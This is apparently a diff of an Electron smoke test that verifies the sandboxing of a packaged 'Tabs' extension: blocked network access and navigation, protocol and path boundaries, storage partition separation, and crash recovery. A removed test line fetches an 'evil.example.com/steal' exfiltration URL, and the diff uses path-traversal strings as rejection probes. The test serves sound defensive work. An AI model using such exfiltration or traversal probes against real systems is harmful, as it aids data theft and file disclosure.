@@ -2,6 +2,7 @@
  * Exercises a real packaged Tabs extension in actual Electron WebContentsView with strict security. */
 const { app, BrowserWindow, protocol } = require("electron");
 const fs = require("node:fs");
+const http = require("node:http");
 const path = require("node:path");
 const assert = require("node:assert/strict");
 
@@ -23,6 +24,7 @@ app.setPath("userData", userDataDir);
 app.setName("Tabs Extension Electron Smoke");
 
 let window = null;
+let probeServer = null;
 let finished = false;
 
 const deadline = setTimeout(() => {
@@ -36,6 +38,9 @@ function finish(code) {
   clearTimeout(deadline);
   try {
     if (window && !window.isDestroyed()) window.destroy();
+  } catch {}
+  try {
+    probeServer?.close();
   } catch {}
   process.exitCode = code;
   app.exit(code);
@@ -178,12 +183,12 @@ app.whenReady().then(async () => {
       profileId: "default",
       activationId: "act-smoke-1",
     });
-    const coldDurationMs = performance.now() - coldStart;
+    const coldActivationMs = performance.now() - coldStart;
 
     let currentView = coordinator.attachedViews[coordinator.attachedViews.length - 1];
     assert.ok(currentView, "WebContentsView must be attached to coordinator");
     console.log(
-      `[5/13] Cold view activation succeeded in ${coldDurationMs.toFixed(2)}ms (WebContentsView attached)`,
+      `[5/13] Cold view activation succeeded in ${coldActivationMs.toFixed(2)}ms (WebContentsView attached)`,
     );
 
     // -------------------------------------------------------------
@@ -208,8 +213,9 @@ app.whenReady().then(async () => {
 
     const profileText = await waitForText(currentView.webContents, "#profile");
     assert.equal(profileText, "default", "DOM #profile must match activation profileId");
+    const coldDurationMs = performance.now() - coldStart;
     console.log(
-      `[6/13] UI DOM verified: heading="${headingText}", project="${projectText}", profile="${profileText}"`,
+      `[6/13] UI DOM verified: heading="${headingText}", project="${projectText}", profile="${profileText}" (${coldDurationMs.toFixed(2)}ms from activation start)`,
     );
 
     // -------------------------------------------------------------
@@ -217,6 +223,10 @@ app.whenReady().then(async () => {
     // -------------------------------------------------------------
     const osPid = currentView.webContents.getOSProcessId();
     assert.ok(osPid > 0, "Renderer OS PID must be a valid positive integer");
+    const hostPid = window.webContents.getOSProcessId();
+    if (hostPid > 0) {
+      assert.notEqual(osPid, hostPid, "Extension and host must not share a renderer process");
+    }
     const appMetrics = app.getAppMetrics();
     const rendererMetric = appMetrics.find((m) => m.pid === osPid);
     assert.ok(rendererMetric, "app.getAppMetrics() must contain the renderer process entry");
@@ -277,32 +287,32 @@ app.whenReady().then(async () => {
     `);
     assert.equal(popupResult, true, "window.open must be denied and evaluate to null");
 
-    // B. Direct external network requests blocked via CSP & webRequest
-    const externalFetch = await currentView.webContents.executeJavaScript(`
-      fetch("https://evil.example.com/steal")
-        .then(() => "success")
-        .catch((err) => "blocked: " + (err.message || String(err)))
-    `);
-    assert.ok(
-      externalFetch.startsWith("blocked:"),
-      `Direct external fetch must reject, got: ${externalFetch}`,
-    );
+    // B. Use a live local listener: a closed port would reject even without the security policy.
+    let directRequests = 0;
+    probeServer = http.createServer((_request, response) => {
+      directRequests++;
+      response.writeHead(200, { "Content-Type": "text/plain" });
+      response.end("UNAUTHORIZED-NETWORK-RESPONSE");
+    });
+    await new Promise((resolve) => probeServer.listen(0, "127.0.0.1", resolve));
+    const probeUrl = `http://127.0.0.1:${probeServer.address().port}/secret`;
 
-    // C. Direct loopback network requests blocked
+    // C. Direct loopback network requests must not reach the listening server.
     const loopbackFetch = await currentView.webContents.executeJavaScript(`
-      fetch("http://127.0.0.1:9999/secret")
-        .then(() => "success")
+      fetch(${JSON.stringify(probeUrl)})
+        .then((response) => response.text())
         .catch((err) => "blocked: " + (err.message || String(err)))
     `);
     assert.ok(
       loopbackFetch.startsWith("blocked:"),
       `Direct loopback fetch must reject, got: ${loopbackFetch}`,
     );
+    assert.equal(directRequests, 0, "Direct fetch must not reach the live local listener");
 
     // D. Unauthorized navigation blocked via will-navigate
     const beforeNavUrl = currentView.webContents.getURL();
     await currentView.webContents.executeJavaScript(`
-      try { window.location.href = "https://unauthorized-navigation.example.com/"; } catch {}
+      try { window.location.href = ${JSON.stringify(probeUrl)}; } catch {}
     `);
     await new Promise((r) => setTimeout(r, 120));
     assert.equal(
@@ -310,47 +320,69 @@ app.whenReady().then(async () => {
       beforeNavUrl,
       "Unauthorized top-level navigation must be blocked by will-navigate",
     );
+    assert.equal(directRequests, 0, "Navigation must not reach the live local listener");
+    await new Promise((resolve) => probeServer.close(resolve));
+    probeServer = null;
     console.log(
-      "[9/13] Restrictions enforced: popups denied, direct network rejected, unauthorized navigation blocked",
+      "[9/13] Restrictions enforced: popups denied, live-listener fetch and navigation never reached the server",
     );
 
     // -------------------------------------------------------------
     // Step 10: Packaging & custom protocol boundary checks
     // -------------------------------------------------------------
-    // A. Valid packaged style.css asset is loaded into the document stylesheet list
-    const styleLoaded = await currentView.webContents.executeJavaScript(`
-      document.styleSheets.length > 0 &&
-      Array.from(document.styleSheets).some((s) => s.href && s.href.includes("style.css"))
-    `);
-    assert.equal(styleLoaded, true, "Packaged style.css stylesheet must be successfully loaded");
-
-    // B. Path traversal escaping package root is rejected by custom protocol handler
-    const traversalBlocked = await currentView.webContents.executeJavaScript(`
-      new Promise((resolve) => {
-        const img = new Image();
-        img.onload = () => resolve(false);
-        img.onerror = () => resolve(true);
-        img.src = "tabs-extension://tabs-example.hello/../../package.json";
-      })
-    `);
-    assert.equal(traversalBlocked, true, "Path traversal escaping package root must be rejected");
-
-    // C. Cross-extension protocol access is rejected by custom protocol handler
-    const crossExtensionBlocked = await currentView.webContents.executeJavaScript(`
-      new Promise((resolve) => {
-        const img = new Image();
-        img.onload = () => resolve(false);
-        img.onerror = () => resolve(true);
-        img.src = "tabs-extension://unauthorized-extension-id/icon.png";
-      })
-    `);
-    assert.equal(
-      crossExtensionBlocked,
-      true,
-      "Cross-extension custom protocol access must be blocked",
+    // A. Prove a known CSS asset is actually served, not merely listed in document.styleSheets.
+    const extensionSession = currentView.webContents.session;
+    const ownCss = await extensionSession.fetch(
+      "tabs-extension://tabs-example.hello/dist/style.css",
     );
+    assert.equal(ownCss.status, 200, "Own packaged stylesheet must be served");
+    assert.match(await ownCss.text(), /place-items:\s*center/);
+    const computedDisplay = await currentView.webContents.executeJavaScript(
+      "getComputedStyle(document.body).display",
+    );
+    assert.equal(computedDisplay, "grid", "Packaged CSS must affect the rendered document");
+
+    // B. Test the actual asset resolver against a canary outside the installed package.
+    const installedDirectory = manager.installed.get(installed.id).directory;
+    const outsideCanary = path.join(temporary, "outside-canary.txt");
+    fs.writeFileSync(outsideCanary, "PRIVATE-CANARY-NOT-PACKAGED");
+    assert.throws(
+      () => manager.resolveAsset(installedDirectory, "../../../outside-canary.txt"),
+      /Invalid extension asset path/,
+      "Path traversal must be rejected before filesystem access",
+    );
+
+    // C. Install a real second package, then request its known asset through the first
+    // extension's partition. A nonexistent host or an image error would be a false positive.
+    const foreignSource = path.join(temporary, "foreign-source");
+    fs.cpSync(helloExtensionDir, foreignSource, { recursive: true });
+    const foreignManifestPath = path.join(foreignSource, "tabs-extension.json");
+    const foreignManifest = JSON.parse(fs.readFileSync(foreignManifestPath, "utf8"));
+    foreignManifest.name = "foreign";
+    fs.writeFileSync(foreignManifestPath, JSON.stringify(foreignManifest));
+    const foreignArchive = path.join(temporary, "tabs-example.foreign.tabsext");
+    await packTabsext({
+      directory: foreignSource,
+      destination: foreignArchive,
+      tabsVersion: "1.3.17",
+    });
+    const foreignInstalled = await manager.installLocalPackage(foreignArchive);
+    assert.equal(foreignInstalled.id, "tabs-example.foreign");
+    let foreignResponse;
+    try {
+      foreignResponse = await extensionSession.fetch(
+        "tabs-extension://tabs-example.foreign/dist/style.css",
+      );
+    } catch {
+      // A canceled protocol request may reject instead of returning an HTTP response.
+    }
+    assert.ok(!foreignResponse?.ok, "First extension partition must not read second package");
     console.log(
-      "[10/13] Protocol boundary verified: only packaged assets load; traversal and foreign origins rejected",
+      "[10/13] Protocol boundary verified: own CSS served, filesystem traversal rejected, installed foreign package denied",
+    );
+
+    await currentView.webContents.executeJavaScript(
+      'localStorage.setItem("smoke-partition-marker", "first-project-profile")',
     );
 
     // -------------------------------------------------------------
@@ -364,13 +396,19 @@ app.whenReady().then(async () => {
       profileId: "profile-smoke-2",
       activationId: "act-smoke-2",
     });
-    const warmDurationMs = performance.now() - warmStart;
-
     currentView = coordinator.attachedViews[coordinator.attachedViews.length - 1];
     const proj2 = await waitForText(currentView.webContents, "#project");
     assert.equal(proj2, "project-smoke-2", "Switching project updates view DOM to project-smoke-2");
     const prof2 = await waitForText(currentView.webContents, "#profile");
     assert.equal(prof2, "profile-smoke-2", "Switching profile updates view DOM to profile-smoke-2");
+    const warmDurationMs = performance.now() - warmStart;
+    assert.equal(
+      await currentView.webContents.executeJavaScript(
+        'localStorage.getItem("smoke-partition-marker")',
+      ),
+      null,
+      "Second project/profile partition must not read first partition's browser storage",
+    );
 
     // Stale activation request: calling hide with previous activationId must NOT hide current view
     manager.hide({ activationId: "act-smoke-1" });
@@ -379,12 +417,30 @@ app.whenReady().then(async () => {
       true,
       "Stale activationId hide request must NOT detach active view",
     );
+    const boundsBefore = currentView.getBounds();
+    manager.setBounds({
+      projectId: "project-smoke-2",
+      extensionId: installed.id,
+      toolId: "hello",
+      profileId: "profile-smoke-2",
+      activationId: "act-smoke-1",
+      x: 999,
+      y: 999,
+      width: 999,
+      height: 999,
+      visible: true,
+    });
+    assert.deepEqual(
+      currentView.getBounds(),
+      boundsBefore,
+      "Stale bounds must not resize the new view",
+    );
     console.log(
-      `[11/13] Project/profile switching verified (${warmDurationMs.toFixed(2)}ms warm switch); stale activation ignored`,
+      `[11/13] Project/profile partition storage and DOM switch verified (${warmDurationMs.toFixed(2)}ms); stale hide/bounds ignored`,
     );
 
     // -------------------------------------------------------------
-    // Step 12: Renderer failure produces recoverable host UI
+    // Step 12: Renderer failure does not destroy the host window and emits an error.
     // -------------------------------------------------------------
     assert.equal(
       viewErrorsReceived.length,
@@ -409,7 +465,7 @@ app.whenReady().then(async () => {
     assert.equal(
       viewErrorsReceived.length,
       1,
-      "Host window must receive exactly one desktop:extension:view-error event",
+      "Host main process must attempt exactly one desktop:extension:view-error IPC send",
     );
     assert.equal(viewErrorsReceived[0].extensionId, installed.id);
     assert.equal(viewErrorsReceived[0].activationId, "act-smoke-2");
@@ -422,11 +478,11 @@ app.whenReady().then(async () => {
       "Crashed view must be cleanly detached from coordinator",
     );
     console.log(
-      `[12/13] Renderer failure handled cleanly: host UI intact, error emitted ("${viewErrorsReceived[0].error}"), view detached`,
+      `[12/13] Renderer failure contained: host window survives, IPC send attempted ("${viewErrorsReceived[0].error}"), view detached`,
     );
 
     // -------------------------------------------------------------
-    // Step 13: Host recovery - Re-activate new view after crash
+    // Step 13: Manager recovery - Re-activate new view after crash.
     // -------------------------------------------------------------
     const recoveryStart = performance.now();
     await manager.activate({
@@ -436,15 +492,21 @@ app.whenReady().then(async () => {
       profileId: "default",
       activationId: "act-smoke-3",
     });
-    const recoveryDurationMs = performance.now() - recoveryStart;
-
     const recoveredView = coordinator.attachedViews[coordinator.attachedViews.length - 1];
     assert.ok(recoveredView, "Recovered view must be attached to coordinator");
     assert.equal(recoveredView.webContents.isDestroyed(), false);
     const recoveredHeading = await waitForText(recoveredView.webContents, "h1");
     assert.equal(recoveredHeading, "Hello from a Tabs extension");
+    const recoveryDurationMs = performance.now() - recoveryStart;
+    assert.equal(
+      await recoveredView.webContents.executeJavaScript(
+        'localStorage.getItem("smoke-partition-marker")',
+      ),
+      "first-project-profile",
+      "Returning to the first profile must recover only its own browser storage",
+    );
     console.log(
-      `[13/13] Host recovery confirmed: new WebContentsView successfully activated and functional (${recoveryDurationMs.toFixed(2)}ms)`,
+      `[13/13] Manager recovery confirmed: replacement WebContentsView functional with first profile storage (${recoveryDurationMs.toFixed(2)}ms)`,
     );
 
     // -------------------------------------------------------------
@@ -464,11 +526,13 @@ app.whenReady().then(async () => {
       metrics: {
         packageCreationMs: Number(packDurationMs.toFixed(2)),
         packageInstallMs: Number(installDurationMs.toFixed(2)),
+        coldViewActivationMs: Number(coldActivationMs.toFixed(2)),
         coldViewStartupMs: Number(coldDurationMs.toFixed(2)),
         warmViewSwitchMs: Number(warmDurationMs.toFixed(2)),
         postCrashRecoveryMs: Number(recoveryDurationMs.toFixed(2)),
         rendererProcess: {
           osPid,
+          hostPid,
           workingSetKb,
           workingSetMb: Number((workingSetKb / 1024).toFixed(2)),
           peakWorkingSetKb,
@@ -477,14 +541,15 @@ app.whenReady().then(async () => {
       },
       measurementMethod: {
         startup:
-          "High-resolution performance.now() timer measuring duration from ExtensionViewManager.activate() invocation to WebContents load completion and DOM confirmation.",
+          "performance.now() around manager.activate() for activation, and through DOM text confirmation for startup/switch/recovery; one run, not a distribution.",
         memory:
           "Chromium process metrics queried via Electron app.getAppMetrics() matching the guest WebContents OS process ID (webContents.getOSProcessId()), recording resident working set size and peak working set.",
       },
       limitations: [
-        "Chromium base renderer overhead: The working set (~60-90 MB on macOS arm64) reflects the full Chromium renderer process footprint (Blink engine, V8 heap VM, compositor pipeline, and IPC bindings) rather than isolated extension DOM/script memory.",
+        "The working-set sample is for the full Chromium renderer process, not incremental memory attributable to extension DOM or scripts; no baseline-subtracted comparison was measured.",
         "Cold vs. warm cache: The first activation initializes session partitions, custom file protocols, and V8 bytecode caches; subsequent view switches benefit from existing warm process state.",
         "Off-screen rendering: In automated headless/inactive test window runs, GPU presentation swapchain buffers differ from an actively focused, full-screen composited user display window.",
+        "The host window is synthetic; the test intercepts the main-process IPC send and does not exercise Tabs React retry UI or real desktop-to-Exchange installation.",
       ],
       assertionsVerified: [
         "Actual packaged .tabsext archive creation and integrity verification",
@@ -492,15 +557,15 @@ app.whenReady().then(async () => {
         "Multi-project and multi-profile assignment configuration",
         "Real WebContentsView UI load and DOM rendering via custom tabs-extension:// protocol",
         "Strict unavailability of Node.js and Electron APIs in guest renderer content",
-        "ContextBridge exposure of typed tabsExtension APIs",
+        "Presence of the tabsExtension bridge namespaces in the guest main world",
         "Denial of unauthorized window.open popups via setWindowOpenHandler",
-        "Rejection of direct external and loopback network requests via CSP and webRequest",
-        "Prevention of unauthorized top-level navigation via will-navigate",
-        "Packaging boundaries: custom protocol loads only packaged assets, blocks traversal and foreign origins",
-        "Project and profile switching dynamically updating replacement view DOM",
-        "Stale activation requests cannot detach or interfere with replacement view",
-        "Isolated crash containment: renderer crash emits view-error event without crashing host window",
-        "Recoverable host UI: host cleanly activates replacement view after renderer crash",
+        "Rejection of direct requests and navigation to a listening loopback server, with zero server hits",
+        "Top-level navigation attempt does not leave the extension URL",
+        "Packaging boundaries: own stylesheet served; resolver rejects traversal; first partition cannot fetch installed foreign package",
+        "Project/profile switching updates DOM and separates browser localStorage partitions",
+        "Stale activation hide and bounds requests cannot interfere with replacement view",
+        "Renderer crash attempts one view-error IPC send without destroying the host window",
+        "Manager activates a functional replacement view after renderer crash",
       ],
     };
 
